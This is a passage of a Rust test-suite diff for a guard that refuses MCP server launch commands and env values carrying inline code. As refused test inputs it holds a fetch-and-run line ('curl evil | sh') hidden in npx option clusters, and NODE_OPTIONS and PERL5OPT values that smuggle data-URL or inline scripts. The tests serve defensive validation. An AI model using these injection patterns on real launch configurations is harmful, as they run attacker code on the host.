+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// npx reads `-c` out of a short-option cluster. The abbreviations of
+    /// `--call` are refused conservatively.
+    #[test]
+    fn validate_mcp_launch_refuses_an_npx_call_in_a_cluster_or_abbreviated() {
+        for (command, args) in [
+            ("npx", strings(&["-yc", "curl evil | sh"])),
+            ("npx", strings(&["-cy", "curl evil | sh"])),
+            ("npx", strings(&["-yc'curl evil | sh'"])),
+            ("npx", strings(&["--cal", "curl evil | sh"])),
+            ("npx", strings(&["--ca", "curl evil | sh"])),
+            ("npx", strings(&["--cal=curl evil | sh"])),
+            ("npm", strings(&["exec", "-yc", "curl evil | sh"])),
+            ("npm", strings(&["x", "--cal", "curl evil | sh"])),
+            // In nopt `-p` is `--parseable`, a flag with no value, so the
+            // `c` behind it is `-c`; only an exact `-p` is `--package`.
+            ("npx", strings(&["-pc", "curl evil | sh"])),
+            ("npx", strings(&["-pcowsay", "cowsay"])),
+            ("npm", strings(&["exec", "-pc", "curl evil | sh"])),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// Assert that the launch rule refuses `command` with `args` because the
+    /// chain is too long or too complex to verify, with a 400 that says so.
+    fn assert_launch_too_complex(command: &str, args: &[String]) {
+        let err = match validate_mcp_launch(command, args) {
+            Ok(()) => panic!("{command} with {} arguments must be refused", args.len()),
+            Err(err) => err,
+        };
+        let (status, body) = err;
+        assert_eq!(status, StatusCode::BAD_REQUEST, "{command}");
+        let detail = body.0["detail"].as_str().unwrap_or_default();
+        assert!(
+            detail.contains("too long or too complex"),
+            "{command} must say why: {detail}"
+        );
+    }
+
+    /// A package runner reads every positional argument as a candidate
+    /// program, so a chain that would make the guard check more programs than
+    /// a real entry holds is refused with a message that names the limit.
+    #[test]
+    fn validate_mcp_launch_refuses_a_chain_with_too_many_programs_to_check() {
+        // 256 candidates and the runner itself are 257 programs.
+        assert_launch_too_complex("npx", &vec!["pkg".to_string(); 256]);
+        assert_launch_too_complex("npm", &{
+            let mut args = strings(&["exec"]);
+            args.extend(vec!["pkg".to_string(); 256]);
+            args
+        });
+        // A runner behind a runner nests deeper than the guard follows.
+        assert_launch_too_complex("npx", &vec!["npx".to_string(); 40]);
+        assert_launch_too_complex("env", &vec!["env".to_string(); 40]);
+        // Just under the limit, the same shape is accepted.
+        assert!(validate_mcp_launch("npx", &vec!["pkg".to_string(); 255]).is_ok());
+    }
+
+    /// A real chain is a handful of programs, far under the limit.
+    #[test]
+    fn validate_mcp_launch_accepts_a_chain_well_under_the_limit() {
+        for (command, args) in [
+            (
+                "env",
+                strings(&[
+                    "A=1",
+                    "env",
+                    "B=2",
+                    "npx",
+                    "-y",
+                    "@scope/pkg",
+                    "--port",
+                    "3000",
+                ]),
+            ),
+            (
+                "npx",
+                strings(&["-y", "@scope/pkg", "--port", "3000", "--root", "/srv/app"]),
+            ),
+            ("python", vec!["x".to_string(); 256]),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// A very long argument list is refused before anything is scanned, so
+    /// the work the guard does stays bounded by the cap, not by the size of
+    /// the request.
+    #[test]
+    fn validate_mcp_launch_refuses_a_very_long_argument_list() {
+        let empty = vec![String::new(); 10_000];
+        for command in ["python", "node", "npx", "npm", "env", "uvx"] {
+            assert_launch_too_complex(command, &empty);
+        }
+        let mut npm = strings(&["exec"]);
+        npm.extend(empty.clone());
+        assert_launch_too_complex("npm", &npm);
+    }
+
+    /// A package runner's own options, their values and the package are no
+    /// reason for a refusal: a value is only a candidate named `silent` or
+    /// `r.example`, and none of them is an interpreter.
+    #[test]
+    fn validate_mcp_launch_accepts_a_runner_option_and_its_value() {
+        for (command, args) in [
+            ("npx", strings(&["-y", "-p", "cowsay", "cowsay", "hi"])),
+            ("npx", strings(&["--cache", "/tmp/cache", "-y", "pkg"])),
+            ("npx", strings(&["-y", "@scope/pkg"])),
+            (
+                "npx",
+                strings(&["-y", "@scope/pkg@1.2.3", "--port", "3000"]),
+            ),
+            ("npx", strings(&["-y", "@scope/pkg", "--port", "3000"])),
+            ("npx", strings(&["--registry", "https://r.example", "pkg"])),
+            ("npx", strings(&["--loglevel", "silent", "pkg"])),
+            ("npx", strings(&["-C", "/tmp", "pkg"])),
+            ("npx", strings(&["--package=cowsay", "cowsay", "hi"])),
+            ("npx", strings(&["-y", "--", "node", "server.js"])),
+            ("npm", strings(&["--prefix", "/tmp", "exec", "pkg"])),
+            ("npm", strings(&["--prefix", "/tmp", "x", "pkg"])),
+            ("npm", strings(&["-C", "/tmp", "x", "pkg"])),
+            ("npm", strings(&["--prefix", "/tmp", "run", "start"])),
+            ("npm", strings(&["run", "start"])),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// The value a short option takes is not a cluster of flags: the letters
+    /// of `bundler/setup` or of a warning filter are not `-e`.
+    #[test]
+    fn validate_mcp_launch_does_not_read_a_short_option_value_as_flags() {
+        for (command, args) in [
+            ("ruby", strings(&["-rbundler/setup", "server.rb"])),
+            ("ruby", strings(&["-I/home/user_a/lib", "server.rb"])),
+            ("perl", strings(&["-I/home/user_a/lib", "server.pl"])),
+            ("perl", strings(&["-MPOSIX=floor", "server.pl"])),
+            ("perl", strings(&["-Mlib=/home/user_a/lib", "server.pl"])),
+            ("perl", strings(&["-mFile::Spec", "server.pl"])),
+            (
+                "python",
+                strings(&["-Wignore::DeprecationWarning", "-m", "pkg"]),
+            ),
+            ("python", strings(&["-Xdev", "-m", "pkg"])),
+            ("python", strings(&["-mpkg"])),
+            ("node", strings(&["-rdotenv/config", "server.js"])),
+            ("node", strings(&["-Cdevelopment", "server.js"])),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// An inline flag that is its own argument, or follows a value option in
+    /// the cluster, is still the flag.
+    #[test]
+    fn validate_mcp_launch_still_finds_an_inline_flag_behind_a_short_option_value() {
+        for (command, args) in [
+            ("python", strings(&["-Wignore", "-c", "print(1)"])),
+            ("python", strings(&["-Xdev", "-c", "print(1)"])),
+            ("python", strings(&["-Sc", "print(1)"])),
+            ("perl", strings(&["-I/home/user_a/lib", "-e", "print 1"])),
+            ("perl", strings(&["-MPOSIX", "-e", "print 1"])),
+            ("perl", strings(&["-wle", "print 1"])),
+            ("ruby", strings(&["-rbundler/setup", "-e", "puts 1"])),
+            ("ruby", strings(&["-rx", "-e", "puts 1"])),
+            ("ruby", strings(&["-I/home/user_a/lib", "-e", "puts 1"])),
+            ("node", strings(&["-r", "dotenv/config", "-e", "1"])),
+            ("node", strings(&["-rdotenv/config", "-e", "1"])),
+            ("node", strings(&["-r", "x", "-e", "console.log(1)"])),
+            ("node", strings(&["-pe", "1"])),
+            // Perl builds `use <spec> ;` out of a `-M`/`-m` argument, so
+            // anything but a module name before the `=` is code.
+            ("perl", strings(&["-Mstrict;print(1)", "server.pl"])),
+            ("perl", strings(&["-MPOSIX(print(1))", "server.pl"])),
+            ("perl", strings(&["-mstrict;print(1)", "server.pl"])),
+            ("perl", strings(&["-wMstrict;print(1)", "server.pl"])),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// An `env` word `NAME=value` sets a variable for the program behind it,
+    /// so a variable the launcher reads as options is read like the entry's
+    /// own `env`.
+    #[test]
+    fn validate_mcp_launch_refuses_an_env_assignment_that_carries_code() {
+        for (command, args) in [
+            (
+                "env",
+                strings(&[
+                    "NODE_OPTIONS=--import=data:text/javascript,console.log(1)",
+                    "npx",
+                    "-y",
+                    "pkg",
+                ]),
+            ),
+            (
+                "env",
+                strings(&[
+                    "NODE_OPTIONS=--require DATA:text/javascript,console.log(1)",
+                    "node",
+                    "server.js",
+                ]),
+            ),
+            (
+                "env",
+                strings(&["NODE_OPTIONS=--eval=console.log(1)", "npx", "-y", "pkg"]),
+            ),
+            (
+                "env",
+                strings(&["-", "NODE_OPTIONS=-p 1", "npx", "-y", "pkg"]),
+            ),
+            (
+                "env",
+                strings(&["PERL5OPT=-Mstrict;print(1)", "perl", "server.pl"]),
+            ),
+            // The quoting is node's: a backslash inside quotes is literal.
+            (
+                "env",
+                strings(&[
+                    "NODE_OPTIONS=--import=\"d\\ata:text/javascript,console.log(1)\"",
+                    "npx",
+                    "-y",
+                    "pkg",
+                ]),
+            ),
+            (
+                "env",
+                strings(&[
+                    "NODE_OPTIONS=\"--imp\\ort=data:text/javascript,console.log(1)\"",
+                    "npx",
+                    "-y",
+                    "pkg",
+                ]),
+            ),
+            // The name is read the way the launcher reads it, not by case.
+            ("env", strings(&["node_options=-e 1", "npx", "-y", "pkg"])),
+            // `-S` splits one string into the assignments and the program.
+            (
+                "env",
+                strings(&[
+                    "-S",
+                    "NODE_OPTIONS=--import=data:text/javascript,console.log(1) npx -y pkg",
+                ]),
+            ),
+            // A nested `env` has its own assignments.
+            (
+                "env",
+                strings(&[
+                    "env",
+                    "NODE_OPTIONS=--import=data:text/javascript,console.log(1)",
+                    "npx",
+                    "-y",
+                    "pkg",
+                ]),
+            ),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// A variable that tunes the launcher without running code is what an
+    /// operator sets, so `env` with it is still accepted.
+    #[test]
+    fn validate_mcp_launch_accepts_an_env_assignment_that_only_tunes_the_launcher() {
+        for (command, args) in [
+            (
+                "env",
+                strings(&["NODE_OPTIONS=--max-old-space-size=4096", "npx", "-y", "pkg"]),
+            ),
+            (
+                "env",
+                strings(&["NODE_OPTIONS=--require ./preload.js", "npx", "-y", "pkg"]),
+            ),
+            (
+                "env",
+                strings(&["NODE_ENV=production", "API_KEY=abc", "uvx", "pkg"]),
+            ),
+            (
+                "env",
+                strings(&["PERL5OPT=-MPOSIX=floor", "perl", "server.pl"]),
+            ),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// `NODE_OPTIONS` and `PERL5OPT` are read by the launcher as options, so
+    /// a value that carries code is refused whichever way the entry's `env`
+    /// map is built.
+    #[test]
+    fn validate_mcp_env_refuses_a_value_the_launcher_reads_as_code() {
+        for (name, value) in [
+            (
+                "NODE_OPTIONS",
+                "--import=data:text/javascript,console.log(1)",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--import data:text/javascript,console.log(1)",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--max-old-space-size=4096 --require=data:text/javascript,console.log(1)",
+            ),
+            ("NODE_OPTIONS", "-r DATA:text/javascript,console.log(1)"),
+            (
+                "NODE_OPTIONS",
+                "--loader=data:text/javascript,console.log(1)",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--experimental-loader data:text/javascript,console.log(1)",
+            ),
+            // Node drops the quotes around an option or its value, and a
+            // backslash inside quotes takes the next character literally.
+            (
+                "NODE_OPTIONS",
+                "--import \"data:text/javascript,console.log(1)\"",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--import=\"d\\ata:text/javascript,console.log(1)\"",
+            ),
+            (
+                "NODE_OPTIONS",
+                "\"--imp\\ort=data:text/javascript,console.log(1)\"",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--imp\"ort=data:text/javascript,console.log(1)\"",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--import \"\" data:text/javascript,console.log(1)",
+            ),
+            (
+                "NODE_OPTIONS",
+                "  --import=data:text/javascript,console.log(1)  ",
+            ),
+            ("NODE_OPTIONS", "--eval=console.log(1)"),
+            ("NODE_OPTIONS", "--print 1"),
+            ("NODE_OPTIONS", "-e 1"),
+            ("NODE_OPTIONS", "-p 1"),
+            ("node_options", "-e 1"),
+            ("PERL5OPT", "-Mstrict;print(1)"),
+            ("PERL5OPT", "-wMstrict;print(1)"),
+            ("PERL5OPT", "Mstrict;print(1)"),
+            ("PERL5OPT", "-e1"),
+        ] {
+            let mut env = HashMap::new();
+            env.insert(name.to_string(), value.to_string());
+            let err = match validate_mcp_env(&env) {
+                Ok(()) => panic!("{name}={value} must be refused"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{name}={value}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script") && detail.contains(name),
+                "{name}={value} must say why: {detail}"
+            );
+        }
+    }
+
+    /// An option the launcher reads that runs no code is accepted, and so is
+    /// a variable that is not read as options.
+    #[test]
+    fn validate_mcp_env_accepts_a_value_that_runs_no_code() {
+        for (name, value) in [
+            ("NODE_OPTIONS", "--max-old-space-size=4096"),
+            ("NODE_OPTIONS", "--require ./preload.js"),
+            (
+                "NODE_OPTIONS",
+                "--import=./register.mjs --enable-source-maps",
+            ),
+            ("NODE_OPTIONS", ""),
+            // Only a space separates options, and a backslash outside quotes
+            // is a backslash: node rejects both of these, it runs no module.
+            (
+                "NODE_OPTIONS",
+                "--import\tdata:text/javascript,console.log(1)",
+            ),
+            (
+                "NODE_OPTIONS",
+                "--import=d\\ata:text/javascript,console.log(1)",
+            ),
+            ("PERL5OPT", "-MPOSIX=floor -w"),
+            ("PERL5OPT", "-Mlib=/home/user_a/lib"),
+            ("NODE_ENV", "production"),
+            ("API_KEY", "-e 1"),
+        ] {
+            let mut env = HashMap::new();
+            env.insert(name.to_string(), value.to_string());
+            assert!(
+                validate_mcp_env(&env).is_ok(),
+                "{name}={value} must be accepted"
+            );
+        }
+    }
+
     /// The words GNU `env -S` splits a string into, with the quoting it
     /// honours.
     #[test]
@@ -3807,6 +4747,17 @@ mod tests {
         command: &str,
         args: Option<Vec<String>>,
     ) -> Result<serde_json::Value, ApiError> {
+        post_mcp_server_with_env(state, name, command, args, None).await
+    }
+
+    /// [`post_mcp_server`] with an `env` map in the request.
+    async fn post_mcp_server_with_env(
+        state: &AppState,
+        name: &str,
+        command: &str,
+        args: Option<Vec<String>>,
+        env: Option<HashMap<String, String>>,
+    ) -> Result<serde_json::Value, ApiError> {
         Box::pin(add_mcp_server(
             State(state.clone()),
             HeaderMap::new(),
@@ -3814,7 +4765,7 @@ mod tests {
             Json(McpServerBody {
                 command: command.to_string(),
                 args,
-                env: None,
+                env,
             }),
         ))
         .await
@@ -3941,6 +4892,208 @@ mod tests {
             assert_eq!(stored.command, command);
             assert_eq!(stored.args, args);
         }
+    }
+
+    fn env_map(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    /// An `env` value the launcher reads as options is part of what runs:
+    /// `NODE_OPTIONS=--import=data:…` on `npx -y pkg` runs code before the
+    /// package starts. The refusal writes nothing.
+    #[tokio::test]
+    async fn mcp_env_that_carries_code_is_refused_and_writes_nothing() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let config_path = config.config_path.clone();
+        let state = console_state(config);
+
+        for (command, args, env) in [
+            (
+                "npx",
+                strings(&["-y", "pkg"]),
+                env_map(&[(
+                    "NODE_OPTIONS",
+                    "--import=data:text/javascript,console.log(1)",
+                )]),
+            ),
+            (
+                "node",
+                strings(&["server.js"]),
+                env_map(&[(
+                    "NODE_OPTIONS",
+                    "--require DATA:text/javascript,console.log(1)",
+                )]),
+            ),
+            (
+                "npx",
+                strings(&["-y", "pkg"]),
+                env_map(&[(
+                    "NODE_OPTIONS",
+                    "--loader=data:text/javascript,console.log(1)",
+                )]),
+            ),
+            (
+                "npx",
+                strings(&["-y", "pkg"]),
+                env_map(&[(
+                    "NODE_OPTIONS",
+                    "--import=\"d\\ata:text/javascript,console.log(1)\"",
+                )]),
+            ),
+            (
+                "perl",
+                strings(&["server.pl"]),
+                env_map(&[("PERL5OPT", "-Mstrict;print(1)")]),
+            ),
+            // The same value as an `env` word of the command itself.
+            (
+                "env",
+                strings(&[
+                    "NODE_OPTIONS=--import=data:text/javascript,console.log(1)",
+                    "npx",
+                    "-y",
+                    "pkg",
+                ]),
+                env_map(&[]),
+            ),
+        ] {
+            let err = match post_mcp_server_with_env(
+                &state,
+                "srv",
+                command,
+                Some(args.clone()),
+                Some(env.clone()),
+            )
+            .await
+            {
+                Ok(response) => panic!("{command} {args:?} {env:?} must be refused: {response}"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(
+                status,
+                StatusCode::BAD_REQUEST,
+                "{command} {args:?} {env:?}"
+            );
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script"),
+                "{command} {args:?} {env:?} must say why: {detail}"
+            );
+            assert!(
+                state.config.lock().mcp_servers.is_empty(),
+                "{command} {args:?} {env:?} was written"
+            );
+            assert!(
+                !config_path.exists(),
+                "{command} {args:?} {env:?} wrote the config file"
+            );
+        }
+    }
+
+    /// A stored `env` value is part of the entry too. An incoming `""` keeps
+    /// the stored value, and a request that sends no `env` keeps the stored
+    /// map, so the rule reads the merged map, not the request's.
+    #[tokio::test]
+    async fn mcp_env_value_that_is_restored_from_the_stored_entry_is_refused() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let config_path = config.config_path.clone();
+        let stored_env = env_map(&[(
+            "NODE_OPTIONS",
+            "--import=data:text/javascript,console.log(1)",
+        )]);
+        config.mcp_servers.insert(
+            "srv".into(),
+            McpServerConfig {
+                command: "npx".into(),
+                args: strings(&["-y", "pkg"]),
+                env: stored_env.clone(),
+            },
+        );
+        let state = console_state(config);
+
+        for env in [Some(env_map(&[("NODE_OPTIONS", "")])), None] {
+            let err = match post_mcp_server_with_env(
+                &state,
+                "srv",
+                "npx",
+                Some(strings(&["-y", "pkg"])),
+                env.clone(),
+            )
+            .await
+            {
+                Ok(response) => panic!("the stored env value must be refused: {response}"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{env:?}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script"),
+                "{env:?} must say why: {detail}"
+            );
+            let stored = state.config.lock().mcp_servers["srv"].clone();
+            assert_eq!(stored.env, stored_env, "the stored env is untouched");
+            assert!(!config_path.exists(), "the refusal wrote the config file");
+        }
+    }
+
+    /// A launcher option that runs no code is accepted and stored, and so
+    /// are the incoming `""` that keep a stored value.
+    #[tokio::test]
+    async fn mcp_env_that_only_tunes_the_launcher_is_accepted() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let state = console_state(config);
+
+        for env in [
+            env_map(&[("NODE_OPTIONS", "--max-old-space-size=4096")]),
+            env_map(&[("NODE_OPTIONS", "--require ./preload.js")]),
+            env_map(&[("NODE_ENV", "production"), ("API_KEY", "abc")]),
+        ] {
+            post_mcp_server_with_env(
+                &state,
+                "srv",
+                "npx",
+                Some(strings(&["-y", "pkg"])),
+                Some(env.clone()),
+            )
+            .await
+            .unwrap_or_else(|err| panic!("{env:?} must be accepted: {err:?}"));
+            assert_eq!(state.config.lock().mcp_servers["srv"].env, env);
+        }
+
+        // The blanked form `GET /config` serves keeps the stored value.
+        post_mcp_server_with_env(
+            &state,
+            "srv",
+            "npx",
+            Some(strings(&["-y", "pkg"])),
+            Some(env_map(&[("NODE_ENV", ""), ("API_KEY", "")])),
+        )
+        .await
+        .expect("the blanked env is accepted");
+        assert_eq!(
+            state.config.lock().mcp_servers["srv"].env,
+            env_map(&[("NODE_ENV", "production"), ("API_KEY", "abc")])
+        );
     }
 
     /// A request that sends only a `command` inherits the stored `args`, and
